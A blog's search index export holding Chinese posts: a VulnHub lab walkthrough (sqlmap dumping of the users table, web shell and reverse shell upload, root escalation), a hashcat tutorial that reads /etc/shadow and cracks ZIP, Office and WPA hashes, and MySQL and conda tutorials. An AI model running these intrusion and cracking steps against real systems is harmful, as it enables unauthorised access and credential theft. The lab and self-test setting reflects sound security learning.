<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>vulnhub-hackme</title>
    <link href="/2020/10/23/vulnhub-hackme/"/>
    <url>/2020/10/23/vulnhub-hackme/</url>
    
    <content type="html"><![CDATA[<p>HACKME:1<br>靶机地址 <a href="https://www.vulnhub.com/entry/hackme-1,330/">https://www.vulnhub.com/entry/hackme-1,330/</a></p><span id="more"></span><figure class="highlight dns"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dns">靶机IP：<span class="hljs-number">192.168.3.142</span><br>kaliIP：<span class="hljs-number">192.168.3.133</span><br></code></pre></div></td></tr></table></figure><p>主机发现</p><p><code>root@kali:~# arp-scan -l</code></p><p>[<img src="https://s1.ax1x.com/2020/10/23/BkgNPs.png" alt="BkgNPs.png" style="zoom:150%;" />]</p><p>端口扫描</p><p>开放了80、22端口</p><p>[<img src="https://s1.ax1x.com/2020/10/23/BkgUGn.png" alt="BkgUGn.png" style="zoom:150%;" />]</p><p>目录扫描</p><p><code>root@kali:~/dirsearch# python3 dirsearch.py -u http://192.168.3.142/ -e *</code></p><p>[<img src="https://s1.ax1x.com/2020/10/23/BkgWxx.png" alt="BkgWxx.png" style="zoom:150%;" />]</p><p>依次访问试试</p><ul><li><code>http://192.168.3.142/login.php</code></li></ul><p>[<img src="https://s1.ax1x.com/2020/10/23/BkgoZD.png" alt="BkgoZD.png" style="zoom:150%;" />]</p><ul><li><code>http://192.168.3.142/register.php</code></li></ul><img src="https://i.loli.net/2020/10/23/4fhzCQHGKDJnOFo.png" style="zoom:150%;" /><ul><li><code>http://192.168.3.142/uploads/</code></li></ul><img src="https://i.loli.net/2020/10/23/Ghipwe6ExHJkQ5R.png" style="zoom:150%;" /><p>试着注册一个用户</p><img src="https://i.loli.net/2020/10/23/gOshmWSaGciu9o8.png" style="zoom:150%;" /><p>登录成功有一个书籍查询的功能</p><img src="https://i.loli.net/2020/10/23/vIkwul4BgTqSDi6.png" style="zoom:150%;" /><p>可以显示全部图书</p><img src="https://i.loli.net/2020/10/23/hsmaNMSGoepWr12.png" style="zoom:150%;" /><p>可以看到这里采用POST传参</p><img src="https://i.loli.net/2020/10/23/Mxtvm64BCAelOjF.png" style="zoom:150%;" /><p>判断可能存在SQL注入，使用sqlmap进行测试<br>注入时要加上SESSION</p><img src="https://i.loli.net/2020/10/23/XEZwBDzRib8NfPW.png" style="zoom:150%;" /><figure class="highlight typescript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs typescript">root<span class="hljs-meta">@kali</span>:~<span class="hljs-regexp">/dirsearch# sqlmap -u http:/</span><span class="hljs-regexp">/192.168.3.142/</span>welcome.php --data <span class="hljs-string">&quot;search=OSINT&quot;</span> --cookie <span class="hljs-string">&quot;PHPSESSID=vk4h6mvmptpnpkaqmh0jv7iuri&quot;</span> --current-user --current-db --is-dba<br></code></pre></div></td></tr></table></figure><p>列出当前⽤户，数据库，当前⽤户是否是dba</p><img src="https://i.loli.net/2020/10/23/N3rh27zFlTBs9Ao.png" style="zoom:150%;" /><p>跑表</p><figure class="highlight jboss-cli"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs jboss-cli">sqlmap -u http:<span class="hljs-string">//192.168.3.142/welcome.php</span> <span class="hljs-params">--data</span> <span class="hljs-string">&quot;search=OSINT&quot;</span> <span class="hljs-params">--cookie</span> <span class="hljs-string">&quot;PHPSESSID=vk4h6mvmptpnpkaqmh0jv7iuri&quot;</span> <span class="hljs-params">--tables</span> -D <span class="hljs-string">&quot;webapphacking&quot;</span><br></code></pre></div></td></tr></table></figure><img src="https://i.loli.net/2020/10/23/CpIKdmAhcWPZR5V.png" style="zoom:150%;" /><p>跑字段</p><figure class="highlight jboss-cli"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs jboss-cli">sqlmap -u http:<span class="hljs-string">//192.168.3.142/welcome.php</span> <span class="hljs-params">--data</span> <span class="hljs-string">&quot;search=OSINT&quot;</span> <span class="hljs-params">--cookie</span> <span class="hljs-string">&quot;PHPSESSID=vk4h6mvmptpnpkaqmh0jv7iuri&quot;</span> <span class="hljs-params">--columns</span> -T users -D <span class="hljs-string">&quot;webapphacking&quot;</span><br></code></pre></div></td></tr></table></figure><img src="https://i.loli.net/2020/10/23/xXfN8yFW2dCqu7D.png" style="zoom:150%;" /><p>跑值</p><figure class="highlight jboss-cli"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs jboss-cli">sqlmap -u http:<span class="hljs-string">//192.168.3.142/welcome.php</span> <span class="hljs-params">--data</span> <span class="hljs-string">&quot;search=OSINT&quot;</span> <span class="hljs-params">--cookie</span> <span class="hljs-string">&quot;PHPSESSID=vk4h6mvmptpnpkaqmh0jv7iuri&quot;</span> <span class="hljs-params">--dump-all</span> -T users -D <span class="hljs-string">&quot;webapphacking&quot;</span><br></code></pre></div></td></tr></table></figure><img src="https://i.loli.net/2020/10/23/yFKUxTcfoewDrCl.png" style="zoom:150%;" /><p><code>11|superadmin|superadmin|superadmin | 2386acb2cf356944177746fc92523983</code></p><p>这个用户比较可疑</p><img src="https://i.loli.net/2020/10/23/qPF4QGILBlU8MiE.png" style="zoom:150%;" /><p>使用这个用户登录</p><p><code>superadmin| Uncrackable</code></p><p>可以看到多了一个上传功能</p><img src="https://i.loli.net/2020/10/23/QPUmOwZt1XR45Df.png" style="zoom:150%;" /><p>尝试上传一个大马，发现没有过滤</p><img src="https://i.loli.net/2020/10/23/bowlTSZdznYaq4m.png" style="zoom:150%;" /><p>访问大马</p><img src="https://i.loli.net/2020/10/23/vHpojKGbX6r1ihP.png" style="zoom:150%;" /><p>上传一个反弹shell</p><img src="https://i.loli.net/2020/10/23/LVXDpyhoYKiMzbP.png" style="zoom:150%;" /><p>访问反弹shell返回一个会话</p><img src="https://i.loli.net/2020/10/23/2SGOdoiAyDVUplv.png" style="zoom:150%;" /><p>执行<code>/home/legacy/</code>下的<code>touchmenot</code>即可获得root权限</p><img src="https://i.loli.net/2020/10/23/xpFY2d5PmQflZ7R.png" style="zoom:150%;" /><p>关于文件里的内容</p><img src="https://i.loli.net/2020/10/23/exEiod9A4UvIcWS.png" style="zoom:150%;" />]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>hashcat</title>
    <link href="/2020/10/22/hashcat/"/>
    <url>/2020/10/22/hashcat/</url>
    
    <content type="html"><![CDATA[<blockquote><p>hashcat是世界上速度最快的离线密码破解工具。它提供多系统、多算法、多硬件平台、分布式等几乎全特性的功能支持，同时还支持OpenCL、CUDA等编程标准，目前hashcat已经实现了所有版本的合并统一。</p></blockquote><span id="more"></span><h2 id="man手册"><a href="#man手册" class="headerlink" title="man手册"></a>man手册</h2><figure class="highlight gherkin"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs gherkin">SYNOPSIS<br>       hashcat [options] hashfile [mask|<span class="hljs-string">wordfiles</span>|<span class="hljs-string">directories]</span><br><span class="hljs-string">       </span><br><span class="hljs-string">hashcat [选项] 破解的哈希值或hash文件、hccapx文件 [</span>|<span class="hljs-string">掩码</span>|<span class="hljs-string">字典</span>|<span class="hljs-string">目录] ...</span><br></code></pre></div></td></tr></table></figure><div class="hljs code-wrapper"><pre><code class="hljs">   Hccapxfile对应无线包，其对应破解哈希类型为&quot;-m 2500 = WPA/WPA2&quot;</code></pre></div><h3 id="例子-Linux密码破解"><a href="#例子-Linux密码破解" class="headerlink" title="例子(Linux密码破解)"></a>例子(Linux密码破解)</h3><p>linux密码保存在<code>shadow</code>文件中</p><div class="hljs code-wrapper"><pre><code class="hljs">root@kali:~/Desktop# cat /etc/shadow</code></pre></div><p>用户名:加密密码:最后一次修改时间:最小修改时间间隔:密码有效期:密码需要变更前的警告天数:密码过期后的宽限时间:账号失效时间:保留字段</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>:$<span class="hljs-number">6</span>$Tt<span class="hljs-number">5363</span>t<span class="hljs-number">67</span>TajfcVJ$dTgLtlM<span class="hljs-number">1</span>ioYcZoN<span class="hljs-number">8</span>riZLv<span class="hljs-number">6</span>.ep<span class="hljs-number">4</span>jWEr<span class="hljs-number">7</span>rwIn.Zn<span class="hljs-number">9</span>Yoq<span class="hljs-number">0</span>Bq<span class="hljs-number">2</span>N<span class="hljs-number">9</span>NYvJyD<span class="hljs-number">0</span>besZkXT<span class="hljs-number">1</span>RhVN<span class="hljs-number">70</span>hJSizKrHat<span class="hljs-number">5</span>ZZ<span class="hljs-number">3</span>wD<span class="hljs-number">0</span>:<span class="hljs-number">18544</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">kali</span>:$<span class="hljs-number">6</span>$YmAFQjzlBmpUlNS<span class="hljs-number">1</span>$ui<span class="hljs-number">9</span>s<span class="hljs-number">3</span>a<span class="hljs-number">7</span>UO/eKK<span class="hljs-number">7</span>BEhEeH<span class="hljs-number">9</span>zc<span class="hljs-number">9</span>VVKiG<span class="hljs-number">4</span>QsLE<span class="hljs-number">45</span>uJxjgPgagI<span class="hljs-number">7</span>RJEAaUfnBwUC/tjTuOuOMTKJCy<span class="hljs-number">2</span>GhBXhv<span class="hljs-number">7</span>qUPa/:<span class="hljs-number">18470</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br></code></pre></div></td></tr></table></figure><p>破解<br><code>root@kali:~# hashcat -w 3 -a 0 -m 1800 -o root.out root.hash  /usr/share/metasploit-framework/data/wordlists/common_roots.txt --force</code></p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">-w, --workload-profile=NUM<br>       Enable a specific workload profile, see pool below<br>        3 = Tuned   performance profile (high latency desktop)<br><br>-a, --attack-mode=NUM<br>       Attack-mode, see references below<br><br>-m, --hash-type=NUM<br>       Hash-type, see references below<br><br>-o, --outfile=FILE<br>       Define outfile for recovered hash <br><br>--force<br>       Disables markov-chains, emulates classic brute-force<br></code></pre></div></td></tr></table></figure><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><h4 id="破解zip压缩包密码"><a href="#破解zip压缩包密码" class="headerlink" title="破解zip压缩包密码"></a>破解zip压缩包密码</h4><p>（一）新建一个压缩包，压缩包密码设置为：654321</p><p>使用工具：winrar、JohnTheRipper</p><p>压缩文件<br><a href="https://imgchr.com/i/BSqdJJ"><img src="https://s1.ax1x.com/2020/10/20/BSqdJJ.png" alt="BSqdJJ.png"></a></p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">D</span>:\JohnTheRipper-v<span class="hljs-number">1.8.0.12</span>\run&gt;zip<span class="hljs-number">2</span>john.exe test.zip<br><span class="hljs-attribute">test</span>.zip:$zip<span class="hljs-number">2</span>$*<span class="hljs-number">0</span>*<span class="hljs-number">3</span>*<span class="hljs-number">0</span>*<span class="hljs-number">30030</span>ae<span class="hljs-number">17503</span>eff<span class="hljs-number">52</span>c<span class="hljs-number">0</span>e<span class="hljs-number">599</span>d<span class="hljs-number">35968</span>d<span class="hljs-number">15</span>*b<span class="hljs-number">9</span>e<span class="hljs-number">8</span>*<span class="hljs-number">2</span>c*d<span class="hljs-number">948</span>f<span class="hljs-number">9</span>d<span class="hljs-number">1</span>ca<span class="hljs-number">6</span>b<span class="hljs-number">50</span>bf<span class="hljs-number">2</span>ca<span class="hljs-number">20</span>b<span class="hljs-number">4</span>d<span class="hljs-number">37</span>d<span class="hljs-number">8</span>be<span class="hljs-number">762790627</span>ec<span class="hljs-number">60</span>e<span class="hljs-number">361</span>c<span class="hljs-number">81</span>d<span class="hljs-number">67</span>de<span class="hljs-number">3</span>aebf<span class="hljs-number">4</span>e<span class="hljs-number">55</span>a<span class="hljs-number">745241</span>cb<span class="hljs-number">73</span>e<span class="hljs-number">701840</span>f<span class="hljs-number">0426</span>c*<span class="hljs-number">192</span>b<span class="hljs-number">3</span>edd<span class="hljs-number">6</span>a<span class="hljs-number">1</span>f<span class="hljs-number">00</span>c<span class="hljs-number">58916</span>*$/zip<span class="hljs-number">2</span>$:::::test.zip-test.txt<br></code></pre></div></td></tr></table></figure><p>（二）将</p><p><code>$zip2$*0*3*0*30030ae17503eff52c0e599d35968d15*b9e8*2c*d948f9d1ca6b50bf2ca20b4d37d8be762790627ec60e361c81d67de3aebf4e55a745241cb73e701840f0426c*192b3edd6a1f00c58916*$/zip2$</code></p><p>保存到文件中</p><p><a href="https://imgchr.com/i/BSqbTS"><img src="https://s1.ax1x.com/2020/10/20/BSqbTS.png" alt="BSqbTS.png"></a></p><p>（三）破解<br><code>root@kali:~/Desktop# hashcat -a 3 -m 13600 zip --force ?d?d?d?d?d?d</code></p><p> 13600 | WinZip | Archives</p><p><a href="https://imgchr.com/i/BSLspj"><img src="https://s1.ax1x.com/2020/10/20/BSLspj.png" alt="BSLspj.png"></a></p><blockquote><p>rar破解和这个差不多，rar2john.exe生成hash，-m 13000:   13000 | RAR5  Archives</p></blockquote><h4 id="破解office"><a href="#破解office" class="headerlink" title="破解office"></a>破解office</h4><p>（一）创建一个加密word文档</p><p><a href="https://imgchr.com/i/BSvZ4O"><img src="https://s1.ax1x.com/2020/10/20/BSvZ4O.png" alt="BSvZ4O.png"></a></p><p>（二）获取hash值</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">D</span>:\JohnTheRipper-v<span class="hljs-number">1.8.0.12</span>\run&gt;python office<span class="hljs-number">2</span>john.py testdoc.docx<br><span class="hljs-attribute">testdoc</span>.docx:$office$*<span class="hljs-number">2013</span>*<span class="hljs-number">100000</span>*<span class="hljs-number">256</span>*<span class="hljs-number">16</span>*<span class="hljs-number">27</span>ccd<span class="hljs-number">9</span>b<span class="hljs-number">01703</span>b<span class="hljs-number">5274</span>c<span class="hljs-number">0</span>b<span class="hljs-number">2</span>c<span class="hljs-number">1</span>e<span class="hljs-number">1</span>e<span class="hljs-number">72</span>d<span class="hljs-number">69</span>f*<span class="hljs-number">2</span>dc<span class="hljs-number">924</span>af<span class="hljs-number">3</span>c<span class="hljs-number">0</span>b<span class="hljs-number">355</span>f<span class="hljs-number">0501</span>a<span class="hljs-number">9</span>ab<span class="hljs-number">7</span>e<span class="hljs-number">8</span>ad<span class="hljs-number">8</span>da*<span class="hljs-number">5</span>c<span class="hljs-number">44</span>cf<span class="hljs-number">0</span>dc<span class="hljs-number">18</span>f<span class="hljs-number">6</span>e<span class="hljs-number">546722</span>aa<span class="hljs-number">17</span>deed<span class="hljs-number">01155</span>ee<span class="hljs-number">8426</span>dce<span class="hljs-number">9</span>e<span class="hljs-number">39669</span>b<span class="hljs-number">431</span>ed<span class="hljs-number">6</span>aebe<span class="hljs-number">5726</span><br></code></pre></div></td></tr></table></figure><p>（三）将hash值保存到文档里</p><p><a href="https://imgchr.com/i/BSzPTx"><img src="https://s1.ax1x.com/2020/10/20/BSzPTx.png" alt="BSzPTx.png"></a></p><p>（四）破解</p><div class="hljs code-wrapper"><pre><code class="hljs">   root@kali:~/Desktop# hashcat -a 3 -m 9600 word --force ?l?l?l?l?l?l</code></pre></div><p>密码qwert，半天也没破出来，可能是因为我的office是2016，9600 | MS Office 2013   Documents</p><h3 id="破解wifi密码"><a href="#破解wifi密码" class="headerlink" title="破解wifi密码"></a>破解wifi密码</h3><figure class="highlight elixir"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs elixir">root<span class="hljs-variable">@kali</span><span class="hljs-symbol">:~/Desktop</span><span class="hljs-comment"># hashcat -m 2500 -a 3 hackwi.hccapx ?d?d?d?d?d?d?d?d?d</span><br></code></pre></div></td></tr></table></figure><p>提示已经破解过了，使用</p><p><code>hashcat -m 2500 -a 3 --show  hackwi.hccapx 666?d?d?d</code></p><p>显示已破解的密码</p><p><a href="https://imgchr.com/i/B9tbjK"><img src="https://s1.ax1x.com/2020/10/21/B9tbjK.png" alt="B9tbjK.png"></a></p><blockquote><p>m参数的取值可以通过man手册查看</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>tools</category>
      
    </categories>
    
    
    <tags>
      
      <tag>hashcat</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>mysqlclient简单使用</title>
    <link href="/2020/09/12/python%E6%93%8D%E4%BD%9Cmysql/"/>
    <url>/2020/09/12/python%E6%93%8D%E4%BD%9Cmysql/</url>
    
    <content type="html"><![CDATA[<p>mysqlclient的简单使用</p><span id="more"></span><h2 id="创建数据库表"><a href="#创建数据库表" class="headerlink" title="创建数据库表"></a>创建数据库表</h2><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> MySQLdb<br>conn = MySQLdb.connect(host = <span class="hljs-string">&#x27;localhost&#x27;</span>,user=<span class="hljs-string">&#x27;root&#x27;</span>,passwd=<span class="hljs-string">&#x27;root&#x27;</span>,db = <span class="hljs-string">&#x27;test&#x27;</span>)<br>cursor = conn.cursor()<span class="hljs-comment">#获取游标</span><br><span class="hljs-comment">#如果已经存在该表则使用execute()方法删除</span><br>cursor.execute(<span class="hljs-string">&quot;drop table if exists conda&quot;</span>)<br><span class="hljs-comment">#创建数据表SQL语句</span><br>sql = <span class="hljs-string">&quot;&quot;&quot;create table conda(</span><br><span class="hljs-string">        first_name char(10) not null,</span><br><span class="hljs-string">        last_name char(10),</span><br><span class="hljs-string">        age int,</span><br><span class="hljs-string">        sex char(1))&quot;&quot;&quot;</span><br><br>cursor.execute(sql)<br>conn.close()<br></code></pre></div></td></tr></table></figure><p>在进行数据库连接时将编码设置为中文</p><p><code>conn = MySQLdb.connect(host = &#39;localhost&#39;,user=&#39;root&#39;,passwd=&#39;root&#39;,db = &#39;test&#39;，charset=&quot;utf-8&quot;)</code></p><p>项目中插入数据</p><p><code>cur.execute(&quot;insert into users (id,username,password) values (%s,%s,%s),(id, user, passwd)&quot;)</code></p><h2 id="插入数据"><a href="#插入数据" class="headerlink" title="插入数据"></a>插入数据</h2><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> MySQLdb<br><br>conn = MySQLdb.connect(host = <span class="hljs-string">&#x27;localhost&#x27;</span>,user=<span class="hljs-string">&#x27;root&#x27;</span>,passwd=<span class="hljs-string">&#x27;root&#x27;</span>,db = <span class="hljs-string">&#x27;test&#x27;</span>)<br>cur = conn.cursor()<span class="hljs-comment">#通过数据库连接conn下的cursor()方法创建游标</span><br><span class="hljs-keyword">try</span>:<br>    cur.execute(<span class="hljs-string">&quot;insert into users (id,username,password) values (&#x27;5&#x27;,&#x27;conda1&#x27;,&#x27;conda321&#x27;)&quot;</span>)<br>    cur.close() <span class="hljs-comment">#关闭游标</span><br>    conn.commit()<span class="hljs-comment"># 提交到数据库执行</span><br><span class="hljs-keyword">except</span>:<br>    conn.rollback()<br><br>conn.close()<br></code></pre></div></td></tr></table></figure><p>rollback 回滚的意思。 就是数据库里做修改后 （ update ,insert , delete）未commit 之前 使用rollback 可以恢复数据到修改之前。</p><p><img src="https://s1.ax1x.com/2020/09/11/wYXlM8.png" alt="向mysql插入数据"></p><h2 id="读取数据"><a href="#读取数据" class="headerlink" title="读取数据"></a>读取数据</h2><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> MySQLdb<br><br>conn = MySQLdb.connect(host = <span class="hljs-string">&#x27;localhost&#x27;</span> ,user = <span class="hljs-string">&#x27;root&#x27;</span> ,passwd = <span class="hljs-string">&#x27;root&#x27;</span> ,db = <span class="hljs-string">&#x27;test&#x27;</span>)<br><br>cur = conn.cursor()<br><br>sql = <span class="hljs-string">&quot;SELECT * FROM users WHERE id &gt; 1&quot;</span><br><span class="hljs-keyword">try</span>:<br>    cur.execute(sql)            <span class="hljs-comment"># 执行sql语句</span><br>    results = cur.fetchall()    <span class="hljs-comment"># 获取所有记录列表</span><br>    <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> results:<br>        <span class="hljs-built_in">id</span> = row[<span class="hljs-number">0</span>]<br>        username = row[<span class="hljs-number">1</span>]<br>        password = row[<span class="hljs-number">2</span>]<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;id=%d, username=%s, password=%s&quot;</span> % (<span class="hljs-built_in">id</span>, username, password))<br><span class="hljs-keyword">except</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Error: unable to fecth data&quot;</span>)<br>        <br>conn.close() <span class="hljs-comment">#关闭数据库</span><br><br></code></pre></div></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-built_in">id</span>=<span class="hljs-number">2</span>, username=Alice, password=<span class="hljs-number">654321</span><br><span class="hljs-built_in">id</span>=<span class="hljs-number">3</span>, username=Tom, password=<span class="hljs-number">666666</span><br><span class="hljs-built_in">id</span>=<span class="hljs-number">4</span>, username=conda, password=conda123<br><span class="hljs-built_in">id</span>=<span class="hljs-number">5</span>, username=conda1, password=conda321<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>爬虫</category>
      
    </categories>
    
    
    <tags>
      
      <tag>mysqlclient</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>conda安装mysqlclient遇到的问题</title>
    <link href="/2020/09/12/conda%E5%AE%89%E8%A3%85mysqlclient%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/"/>
    <url>/2020/09/12/conda%E5%AE%89%E8%A3%85mysqlclient%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h2 id="canda安装mysqlclient遇到的问题"><a href="#canda安装mysqlclient遇到的问题" class="headerlink" title="canda安装mysqlclient遇到的问题"></a>canda安装mysqlclient遇到的问题</h2><p>我的PC有三个python环境，所以有时安装模块总会遇到一些问题</p><span id="more"></span><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">C</span>:\Users\Mto\Desktop&gt;py -<span class="hljs-number">2</span> -V<br><span class="hljs-attribute">Python</span> <span class="hljs-number">2</span>.<span class="hljs-number">7</span>.<span class="hljs-number">15</span><br><br><span class="hljs-attribute">C</span>:\Users\Mto\Desktop&gt;py -<span class="hljs-number">3</span> -V<br><span class="hljs-attribute">Python</span> <span class="hljs-number">3</span>.<span class="hljs-number">8</span>.<span class="hljs-number">3</span><br></code></pre></div></td></tr></table></figure><p>此外还有conda的环境</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">C</span>:\Users\Mto&gt;conda -V<br><span class="hljs-attribute">conda</span> <span class="hljs-number">4</span>.<span class="hljs-number">8</span>.<span class="hljs-number">4</span><br></code></pre></div></td></tr></table></figure><p>原本想着<code>conda install mysqlclient</code>一句话的事</p><p>看下图，提示</p><p>conda提示不兼容，但我用py3之前安装成功了</p><p><img src="https://i.loli.net/2020/09/11/aNRS2XGLpW9jfzm.png"></p><p>报错</p><figure class="highlight vim"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vim">UnsatisfiableError: The following specifications were found<br><span class="hljs-keyword">to</span> <span class="hljs-keyword">be</span> incompatible with the existing <span class="hljs-keyword">python</span> installation in your environmen<span class="hljs-variable">t:</span><br><br>Specification<span class="hljs-variable">s:</span><br><br>  - mysqlclient -&gt; <span class="hljs-keyword">python</span>[<span class="hljs-keyword">version</span>=<span class="hljs-string">&#x27;&gt;=2.7,&lt;2.8.0a0|&gt;=3.6,&lt;3.7.0a0|&gt;=3.7,&lt;3.8.0a0|&gt;=3.5,&lt;3.6.0a0&#x27;</span>]<br><br>Your <span class="hljs-keyword">python</span>: <span class="hljs-keyword">python</span>=<span class="hljs-number">3.8</span><br><br>If <span class="hljs-keyword">python</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">on</span> the <span class="hljs-keyword">left</span>-most side of the chain, that<span class="hljs-string">&#x27;s the version you&#x27;</span><span class="hljs-keyword">ve</span> asked <span class="hljs-keyword">for</span>.<br>When <span class="hljs-keyword">python</span> appears <span class="hljs-keyword">to</span> the <span class="hljs-keyword">right</span>, that indicates that the thing <span class="hljs-keyword">on</span> the <span class="hljs-keyword">left</span> <span class="hljs-keyword">is</span> somehow<br>not available <span class="hljs-keyword">for</span> the <span class="hljs-keyword">python</span> <span class="hljs-keyword">version</span> you are constrained <span class="hljs-keyword">to</span>. Note that conda will not<br><span class="hljs-keyword">change</span> your <span class="hljs-keyword">python</span> <span class="hljs-keyword">version</span> <span class="hljs-keyword">to</span> <span class="hljs-keyword">a</span> different minor <span class="hljs-keyword">version</span> unless you explicitly specify<br>that.<br><br>The following specifications were found <span class="hljs-keyword">to</span> <span class="hljs-keyword">be</span> incompatible with your CUDA driver:<br><br>  - feature:/win-<span class="hljs-number">64</span>::__cuda==<span class="hljs-number">10.2</span>=<span class="hljs-number">0</span><br><br>Your installed CUDA driver i<span class="hljs-variable">s:</span> <span class="hljs-number">10.2</span><br></code></pre></div></td></tr></table></figure><h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><blockquote><p>下载库，使用conda里的pip进行安装，上面虽然提示兼容问题，但我测试可以使用</p></blockquote><h3 id="下载mysqlclient"><a href="#下载mysqlclient" class="headerlink" title="下载mysqlclient"></a>下载mysqlclient</h3><p><code>https://pypi.org/project/mysqlclient/#files</code></p><p>选择一个版本</p><p><img src="https://i.imgur.com/5iSVgKq.png"></p><h3 id="使用conda当前环境的pip进行安装"><a href="#使用conda当前环境的pip进行安装" class="headerlink" 